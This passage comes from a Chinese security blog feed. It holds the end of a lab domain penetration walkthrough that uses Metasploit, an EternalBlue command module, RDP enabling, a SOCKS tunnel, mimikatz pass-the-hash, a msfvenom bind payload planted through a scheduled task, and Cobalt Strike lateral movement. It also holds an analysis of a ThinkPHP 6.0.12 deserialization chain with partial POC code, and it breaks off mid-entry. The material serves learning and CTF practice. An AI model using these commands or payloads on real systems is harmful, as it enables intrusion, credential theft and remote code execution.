href="/images/62bf4af81d64b07066dcf522.jpg" title="image-20220701173317196" class="gallery-item"><img src="/images/62bf4af81d64b07066dcf522.jpg" alt="image-20220701173317196"></a></p><p>DC为OWA这台主机。</p><p><code>ipconfig /all</code>：</p><p><a href="/images/62bf4b041d64b07066dcfdb1.jpg" title="image-20220701182815869" class="gallery-item"><img src="/images/62bf4b041d64b07066dcfdb1.jpg" alt="image-20220701182815869"></a></p><p>可以得知这台主机的内网IP为192.168.52.143，我们可以利用nmap来扫描一波内网（这台主机内置nmap了）：</p><p><a href="/images/62bf4b121d64b07066dd07ce.jpg" title="image-20220701183124997" class="gallery-item"><img src="/images/62bf4b121d64b07066dd07ce.jpg" alt="image-20220701183124997"></a></p><p>拿到内网的另外两台主机的IP为192.168.52.138和192.168.52.141。</p><h3 id="内网突破"><a href="#内网突破" class="headerlink" title="内网突破"></a>内网突破</h3><p>接下来对这两个内网主机的渗透都基本依托攻击机的msf完成，所以我们这里直接在msf中添加路由来使攻击机可以访问到内网资源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b221d64b07066dd131f.jpg" title="image-20220701195219880" class="gallery-item"><img src="/images/62bf4b221d64b07066dd131f.jpg" alt="image-20220701195219880"></a></p><p>接着我们尝试扫描永恒之蓝：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b2c1d64b07066dd1a11.jpg" title="image-20220701195513265" class="gallery-item"><img src="/images/62bf4b2c1d64b07066dd1a11.jpg" alt="image-20220701195513265"></a></p><p>445端口开启，存在smb服务，看看是否存在永恒之蓝：</p><p><a href="/images/62bf4b361d64b07066dd2104.jpg" title="image-20220701195636083" class="gallery-item"><img src="/images/62bf4b361d64b07066dd2104.jpg" alt="image-20220701195636083"></a></p><p>很有可能存在，那我们尝试打一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">options</span><br><span class="line">set command whoami</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b571d64b07066dd3a41.jpg" title="image-20220701211222844" class="gallery-item"><img src="/images/62bf4b571d64b07066dd3a41.jpg" alt="image-20220701211222844"></a></p><p>成功执行命令！那我们接下来再看一下这台主机的端口，很简单，只需要将command参数改为<code>netstat -na</code>继续run一下就可以了：</p><p><a href="/images/62bf4b641d64b07066dd4486.jpg" title="image-20220701211350099" class="gallery-item"><img src="/images/62bf4b641d64b07066dd4486.jpg" alt="image-20220701211350099"></a></p><p>并未发现3389端口，那我们再利用如下命令再开一下3389端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b801d64b07066dd5b2e.jpg" title="image-20220701212047024" class="gallery-item"><img src="/images/62bf4b801d64b07066dd5b2e.jpg" alt="image-20220701212047024"></a></p><p>接着再查看一下端口：</p><p><a href="/images/62bf4b891d64b07066dd621e.jpg" title="image-20220701212102819" class="gallery-item"><img src="/images/62bf4b891d64b07066dd621e.jpg" alt="image-20220701212102819"></a></p><p>3389端口被成功打开，接着就是要开启远程桌面了。但是这台主机并不能访问外网，因此不能访问我们的攻击机。这里我们使用别的师傅提到的<a href="https://www.freebuf.com/articles/network/275436.html">隐藏通信隧道技术</a>，借助那台win7作为跳板机完成内网穿透。</p><p>将ew_for_win32.exe给Win7上传上去，接着在我们攻击机本地添加转接隧道：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux -s rcsocks -l 1080 -e 4444 #要先把4444端口给打开</span><br></pre></td></tr></table></figure><p>接着在Win7中执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d 192.168.229.133 -e 4444</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4b9c1d64b07066dd6edf.jpg" title="image-20220701212740562" class="gallery-item"><img src="/images/62bf4b9c1d64b07066dd6edf.jpg" alt="image-20220701212740562"></a></p><p>隧道搭建成功。接下来我们修改proxychains4.conf添加如下代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5  192.168.229.133 1080</span><br></pre></td></tr></table></figure><p>保存并退出后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4ba61d64b07066dd761d.jpg" title="image-20220701213408165" class="gallery-item"><img src="/images/62bf4ba61d64b07066dd761d.jpg" alt="image-20220701213408165"></a></p><p>使用之前拿到的域管的账号，成功登陆！拿下192.168.52.141：</p><p><a href="/images/62bf4bb01d64b07066dd7e9f.jpg" title="image-20220701213500383" class="gallery-item"><img src="/images/62bf4bb01d64b07066dd7e9f.jpg" alt="image-20220701213500383"></a></p><p>接着我们开始打192.168.52.138，但是这台主机利用刚刚上面的方法，却无法拿到远程桌面。</p><p><a href="/images/62bf4bbc1d64b07066dd878c.jpg" title="image-20220701214410519" class="gallery-item"><img src="/images/62bf4bbc1d64b07066dd878c.jpg" alt="image-20220701214410519"></a></p><p>一直连接不上。尝试拿Win7那台nmap扫一下192.168.52.138这台，才发现3389给设置了防火墙：</p><p><a href="/images/62bf4bc91d64b07066dd919a.jpg" title="image-20220701220224803" class="gallery-item"><img src="/images/62bf4bc91d64b07066dd919a.jpg" alt="image-20220701220224803"></a></p><p>那这台看来确实是没法拿到远程桌面了。除非是进去给他防火墙关了：</p><p><a href="/images/62bf4bdb1d64b07066dd9e02.jpg" title="image-20220701220729492" class="gallery-item"><img src="/images/62bf4bdb1d64b07066dd9e02.jpg" alt="image-20220701220729492"></a></p><p>这下再尝试利用刚刚的方法拿远程桌面就能拿到了：</p><p><a href="/images/62bf4be51d64b07066dda4f6.jpg" title="image-20220701220711892" class="gallery-item"><img src="/images/62bf4be51d64b07066dda4f6.jpg" alt="image-20220701220711892"></a></p><p>但是这很明显没什么意思，那我们 就换个思路打它，试一下之前用mimikatz抓取的哈希值进行哈希传递登录域控：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::pth /domain:god.org /user:administrator /ntlm:your_ntml_hash</span><br></pre></td></tr></table></figure><p>尝试访问域控共享服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure><p><a href="/images/62bf4bf91d64b07066ddb160.jpg" title="image-20220702022902556" class="gallery-item"><img src="/images/62bf4bf91d64b07066ddb160.jpg" alt="image-20220702022902556"></a></p><p>访问成功。因为192.168.52.138这台不出网，但是又因为我们刚刚已经设置路由，所以接下来我们可以利用正向连接来拿shell。首先构造个正向连接的攻击载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp  LPORT=456 -f exe -o xxx.exe</span><br></pre></td></tr></table></figure><p>接着我们将这个xxx.exe传入Win7那台机器，并从Win7传到192.168.52.138：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload xxx.exe C:\\</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\&gt;copy xxx.exe \\192.168.52.138\C$</span><br><span class="line">C:\&gt;schtasks /create /tn &quot;evil_task&quot; /tr C:\yyy.exe /sc once /st 12:00 /S 192.168.52.138 /RU System  /u administrator /p &quot;your_password&quot;</span><br></pre></td></tr></table></figure><p>接着利用exploit&#x2F;multi&#x2F;handler模块，设置payload为windows&#x2F;meterpreter&#x2F;bind_tcp，设置好rhost和lport，然后run就可以了：</p><p><a href="/images/62bf4c041d64b07066ddb7ca.jpg" title="image-20220702025146824" class="gallery-item"><img src="/images/62bf4c041d64b07066ddb7ca.jpg" alt="image-20220702025146824"></a></p><p>至此，MSF正式打完！</p><h2 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h2><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>利用http listenner生成一个payload，然后放到蚁剑那里去执行以下：</p><p><a href="/images/62bf4c141d64b07066ddc2e7.jpg" title="image-20220702025559691" class="gallery-item"><img src="/images/62bf4c141d64b07066ddc2e7.jpg" alt="image-20220702025559691"></a></p><p>成功上线：</p><p><a href="/images/62bf4c1d1d64b07066ddcaa0.jpg" title="image-20220702025616044" class="gallery-item"><img src="/images/62bf4c1d1d64b07066ddcaa0.jpg" alt="image-20220702025616044"></a></p><p>同样的内网信息收集就不在这里再列举了，可以参考MSF收集信息时的步骤。对了，记得使用命令前，设置一下sleep，毕竟是靶机嘛，可以稍微大胆一点。</p><h3 id="内网突破-1"><a href="#内网突破-1" class="headerlink" title="内网突破"></a>内网突破</h3><p>利用CS自带的mimikatz拿到明文密码：</p><p><a href="/images/62bf4c291d64b07066ddd2a8.jpg" title="image-20220702030022084" class="gallery-item"><img src="/images/62bf4c291d64b07066ddd2a8.jpg" alt="image-20220702030022084"></a></p><p><a href="/images/62bf4c331d64b07066ddda54.jpg" title="image-20220702030153351" class="gallery-item"><img src="/images/62bf4c331d64b07066ddda54.jpg" alt="image-20220702030153351"></a></p><p>接着我们可以利用psexec和刚刚得到的密码，与内网中别的主机进行连接：</p><p><a href="/images/62bf4c441d64b07066dde730.jpg" title="image-20220702030315702" class="gallery-item"><img src="/images/62bf4c441d64b07066dde730.jpg" alt="image-20220702030315702"></a></p><p><a href="/images/62bf4c4f1d64b07066ddefd8.jpg" title="image-20220702030354739" class="gallery-item"><img src="/images/62bf4c4f1d64b07066ddefd8.jpg" alt="image-20220702030354739"></a></p><p>其中监听器设置SMB，会话选择Win7的那台。成功连接：</p><p><a href="/images/62bf4c5e1d64b07066ddfb3b.jpg" title="image-20220702030441329" class="gallery-item"><img src="/images/62bf4c5e1d64b07066ddfb3b.jpg" alt="image-20220702030441329"></a></p><p><a href="/images/62bf4c691d64b07066de0731.jpg" title="image-20220702030453713" class="gallery-item"><img src="/images/62bf4c691d64b07066de0731.jpg" alt="image-20220702030453713"></a></p><p>可以看一下文件管理：</p><p><a href="/images/62bf4c721d64b07066de0de2.jpg" title="image-20220702030519270" class="gallery-item"><img src="/images/62bf4c721d64b07066de0de2.jpg" alt="image-20220702030519270"></a></p><p>另外一台也是同样的方法，成功连接：</p><p><a href="/images/62bf4c7b1d64b07066de149f.jpg" title="image-20220702030618391" class="gallery-item"><img src="/images/62bf4c7b1d64b07066de149f.jpg" alt="image-20220702030618391"></a></p><p>顺便利用梼杌插件来个小娱乐：</p><p><a href="/images/62bf4c841d64b07066de1b09.jpg" title="image-20220702031636250" class="gallery-item"><img src="/images/62bf4c841d64b07066de1b09.jpg" alt="image-20220702031636250"></a></p><p><a href="/images/62bf4c8c1d64b07066de20b5.jpg" title="image-20220702031657035" class="gallery-item"><img src="/images/62bf4c8c1d64b07066de20b5.jpg" alt="image-20220702031657035"></a></p><p>至此，打完，收工！</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6.0.12反序列化RCE挖掘</title>
      <link href="/2022/06/19/thinkphpAudit/"/>
      <url>/2022/06/19/thinkphpAudit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在半个月前的CISCN线上初赛的时候碰到了一道关于ThinkPHP6.0.12LTS反序列化漏洞的题目，当时解题是直接用的网上的POC，没有细致的研究这个漏洞POP链的挖掘，这篇文章就对这个漏洞进行一个复现和分析。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p>PHP8.0.2</p></li><li><p>thinkphp6.0.12</p></li></ul><p><strong>thinkphp6.0.12下载：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp6  # 自动下载最新版的</span><br></pre></td></tr></table></figure><p>这里需要注意的是，thinkphp6需要用到php7.1以上才能下载。</p><h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><p>反序列化的入口一般是<code>__wake()</code>、<code>__destruct()</code>或者<code>__construct()</code>，所以我们直接全局搜索，定位到<code>vendor\topthink\think-orm\src\Model.php</code>：</p><p><a href="/images/62aee6a109475431296c5c06.png" title="image-20220619135204692" class="gallery-item"><img src="/images/62aee6a109475431296c5c06.png" alt="image-20220619135204692"></a></p><p>可以发现当<code>$this-&gt;lazySave</code>为true时，就会执行<code>$this-&gt;save()</code>。继续跟进<code>$this-&gt;save()</code>：</p><p><a href="/images/62aee6b209475431296c70d7.png" title="image-20220619135706565" class="gallery-item"><img src="/images/62aee6b209475431296c70d7.png" alt="image-20220619135706565"></a></p><p>其中漏洞方法为<code>updateData()</code>。因此我们需要先绕过第一个if语句：</p><p><a href="/images/62aee6bb09475431296c7d13.png" title="image-20220619135755379" class="gallery-item"><img src="/images/62aee6bb09475431296c7d13.png" alt="image-20220619135755379"></a></p><p>跟进<code>$this-&gt;isEmpty()</code>方法：</p><p><a href="/images/62aee6d009475431296c995a.png" title="image-20220619135854188" class="gallery-item"><img src="/images/62aee6d009475431296c995a.png" alt="image-20220619135854188"></a></p><p>发现这里判断<code>$this-&gt;data</code>这个变量是否为空，绕过也很简单，给<code>$this-&gt;data</code>赋值即可。接着跟进<code>$this-&gt;trigger()</code>：</p><p><a href="/images/62aee6d909475431296ca4e9.png" title="image-20220619140138544" class="gallery-item"><img src="/images/62aee6d909475431296ca4e9.png" alt="image-20220619140138544"></a></p><p>发现只要我们将<code>$this-&gt;withEvent</code>设为false，那么<code>$this-&gt;trigger()</code>就会返回true，从而使得<code>false===true</code>，结果为false，成功绕过if来到536行的反序列化链漏洞点：</p><p><a href="/images/62aee6e509475431296cb323.png" title="image-20220619140416516" class="gallery-item"><img src="/images/62aee6e509475431296cb323.png" alt="image-20220619140416516"></a></p><p>这里将<code>$this-&gt;exists</code>设为true即可调用<code>$this-&gt;updateData</code>方法。跟进<code>$this-&gt;updateData()</code>：</p><p><a href="/images/62aee6f209475431296cc2c2.png" title="image-20220619140556139" class="gallery-item"><img src="/images/62aee6f209475431296cc2c2.png" alt="image-20220619140556139"></a></p><p>这里调用了<code>$this-&gt;checkAllowFields()</code>方法，跟进一下：</p><p><a href="/images/62aee70309475431296cd695.png" title="image-20220619140704310" class="gallery-item"><img src="/images/62aee70309475431296cd695.png" alt="image-20220619140704310"></a></p><p>跟进后，发现这里调用了<code>$this-&gt;db()</code>方法，继续跟进<code>$this-&gt;db</code>方法：</p><p><a href="/images/62aee70f09475431296ce4a0.png" title="image-20220619140910082" class="gallery-item"><img src="/images/62aee70f09475431296ce4a0.png" alt="image-20220619140910082"></a></p><p>发现如果<code>$this-&gt;table</code>不为空的话，就会将<code>$this-&gt;table</code>与<code>$this-&gt;suffix</code>进行拼接，同时调用table方法进行处理。这里进行了拼接操作，因此我们可以全局搜索一下是否有<code>__toString()</code>方法，这样我们只需要将<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>其中一个赋值为<code>__toString()</code>所在的类，即可调用该<code>__toString</code>方法。全局搜索后，定位到vendor\topthink\think-orm\src\model\concern\Conversion.php：</p><p><a href="/images/62aee72609475431296d024c.png" title="image-20220619141533127" class="gallery-item"><img src="/images/62aee72609475431296d024c.png" alt="image-20220619141533127"></a></p><p>这里调用了<code>$this-&gt;toJsong()</code>方法，跟进一下：</p><p><a href="/images/62aee72f09475431296d0d84.png" title="image-20220619141610797" class="gallery-item"><img src="/images/62aee72f09475431296d0d84.png" alt="image-20220619141610797"></a></p><p>继续跟进<code>$this-&gt;toArray()</code>：</p><p><a href="/images/62aee73b09475431296d1b5b.png" title="image-20220619141912697" class="gallery-item"><img src="/images/62aee73b09475431296d1b5b.png" alt="image-20220619141912697"></a></p><p>发现这里的<code>$data</code>变量是将<code>$this-&gt;data</code>与<code>$this-&gt;relation</code>进行合并，接着遍历<code>$data</code>这个数组，最终执行图中箭头所示的代码，执行<code>$this-&gt;getAttr($key)</code>。可以发现如果我们可以控制<code>$this-&gt;data</code>和<code>$this-&gt;relation</code>其一，我们就可以控制这个<code>$key</code>，也就是控制<code>$this-&gt;getAttr()</code>的参数。那么跟进一下<code>$this-&gt;getAttr()</code>：</p><p><a href="/images/62aee74709475431296d2c2c.png" title="image-20220619142339508" class="gallery-item"><img src="/images/62aee74709475431296d2c2c.png" alt="image-20220619142339508"></a></p><p>发现这里的<code>$this-&gt;getData()</code>传入了我们的可控参数<code>$name</code>，跟进一下：</p><p><a href="/images/62aee75409475431296d3d38.png" title="image-20220619142609634" class="gallery-item"><img src="/images/62aee75409475431296d3d38.png" alt="image-20220619142609634"></a></p><p><code>$this-&gt;getRealFieldName()</code>方法中传入了可控参数<code>$name</code>，继续跟进：</p><p><a href="/images/62aee76309475431296d500d.png" title="image-20220619142828483" class="gallery-item"><img src="/images/62aee76309475431296d500d.png" alt="image-20220619142828483"></a></p><p>发现这里默认返回的就是我们传入的可控参数<code>$name</code>。那么也就是说<code>getData()</code>中的<code>$fieldName</code>可控，那么紧接着的是<code>getData()</code>中返回的值（<code>$this-&gt;data[$filedName]</code>）可控，然后就是<code>getAttr()</code>中的<code>$value</code>可控，这一点可以通过观察上面三副图片可以知道。</p><p>发现<code>getAttr()</code>中的<code>$value</code>可控，那么接下来就是<code>getAttr()</code>中的<code>$this-&gt;getValue()</code>了，跟进一下：</p><p><a href="/images/62aee77609475431296d6b85.png" title="image-20220619143734568" class="gallery-item"><img src="/images/62aee77609475431296d6b85.png" alt="image-20220619143734568"></a></p><p>其中<code>$fieldName = $this-&gt;getRealFieldName($name);</code>，<code>getRealFieldName()</code>我们刚刚看了，默认返回的就是<code>$name</code>，因此这里的<code>$fieldName</code>的值就是<code>$name</code>。接着审计，可以发现<code>$this-&gt;getJsonValue()</code>中传入的两个参数都是我们可控的。跟进一下这个函数：</p><p><a href="/images/62aee79c09475431296da44a.png" title="image-20220619143938750" class="gallery-item"><img src="/images/62aee79c09475431296da44a.png" alt="image-20220619143938750"></a></p><p>我们看一下我们可控的参数：<code>$name</code>,<code>$value</code>,<code>$this-&gt;withAttr</code>。审计一下这段遍历数组的部分，因为这里遍历的是<code>$this-&gt;withAttr[$name]</code>，因此我们需要将<code>$this-&gt;withAttr[$name]</code>设为一个数组。并且还可以发现<code>$value</code>也应该是一个数组。那么至此思路就很明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]] <span class="comment"># $name此时为&#x27;rainb0w&#x27;,$value为[&#x27;temp&#x27;=&gt;&#x27;whoami&#x27;]</span></span><br><span class="line">进入<span class="title function_ invoke__">getJsonValue</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withAttr=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]] </span><br><span class="line">进行遍历操作时，遍历的数组就是<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&#x27;rainb0w&#x27;</span>],也就是[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]这个数组。其中<span class="variable">$key</span>为temp,<span class="variable">$closure</span>为system</span><br><span class="line"><span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>，进入<span class="keyword">if</span></span><br><span class="line"><span class="variable">$value</span>[<span class="string">&#x27;temp&#x27;</span>] = <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>,<span class="variable">$value</span>)</span><br></pre></td></tr></table></figure><p>起初我以为<code>$value[&#39;temp&#39;] = system(&#39;whoami&#39;,$value)</code>这里并不能执行成功，后来在本地测试了一下，结果如下：</p><p><a href="/images/62aee7ac09475431296dbb77.png" title="image-20220619152556438" class="gallery-item"><img src="/images/62aee7ac09475431296dbb77.png" alt="image-20220619152556438"></a></p><p>至此POP链已经找完了。接下来就是写POC了。不过在写POC的之前，我们先在app&#x2F;controller&#x2F;index.php中加入我们的测试代码：</p><p><a href="/images/62aee7f909475431296e2376.png" class="gallery-item"><img src="/images/62aee7f909475431296e2376.png"></a></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>首先入口是Model类中的<code>__desruct()</code>方法：</p><p><a href="/images/62aee7bc09475431296dd17a.png" title="image-20220619152751168" class="gallery-item"><img src="/images/62aee7bc09475431296dd17a.png" alt="image-20220619152751168"></a></p><p>这里需要将<code>$this-&gt;lazySave</code>设为true，接着进入<code>$this-&gt;save()</code>：</p><p><a href="/images/62aee81e09475431296e524b.png" title="image-20220619152841383" class="gallery-item"><img src="/images/62aee81e09475431296e524b.png" alt="image-20220619152841383"></a></p><p>这里需要将<code>$this-&gt;data</code>不设为空，使得<code>$this-&gt;isEmpty()</code>的值为false。<code>$this-&gt;withEvent</code>设为false，使得<code>$this-&gt;trigger()</code>返回ture，从而使得false&#x3D;&#x3D;&#x3D;true，绕过if。接着将<code>$this-&gt;exists</code>的值设为true，执行<code>$this-&gt;updateData()</code>。</p><p>因此此时的POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一部分一部分地写POC也是为了更方便的去了解整个POC的编写流程。继续根据上面的分析，编写POC。</p><p>接下来就是从跟进<code>$this-&gt;updateData()</code>那里开始了，发现需要将<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>这两个其中一个new一个<code>Conversion</code>类，但是需要注意的是，<code>Conversion</code>类是被trait修饰的类，并不是一个可实例化的类：</p><p><a href="/images/62aee82f09475431296e660d.png" title="image-20220619154214044" class="gallery-item"><img src="/images/62aee82f09475431296e660d.png" alt="image-20220619154214044"></a></p><p>这是文档中关于trait的解释：</p><p><a href="/images/62aee84109475431296e7cb1.png" title="image-20220619154300792" class="gallery-item"><img src="/images/62aee84109475431296e7cb1.png" alt="image-20220619154300792"></a></p><p>因此接下来，我们需要找一下谁use了这个<code>Conversion</code>类，全局搜索一下，发现正是刚刚的<code>Model</code>类：</p><p><a href="/images/62aee84b09475431296e8891.png" title="image-20220619154619063" class="gallery-item"><img src="/images/62aee84b09475431296e8891.png" alt="image-20220619154619063"></a></p><p>但是<code>Model</code>类是个抽象类abstract，也无法被调用，我们需要再找一下谁use了<code>Model</code>类，继续全局搜索，有符合的很多类，但是大多数师傅们都选的是这个<code>Pivot</code>类，因此我们这里也来使用一下吧：</p><p><a href="/images/62aee85509475431296e9534.png" title="image-20220619154957327" class="gallery-item"><img src="/images/62aee85509475431296e9534.png" alt="image-20220619154957327"></a></p><p>继续编写一部分POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">​</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着从<code>toJson()</code>那里的分析往下看：</p><p><a 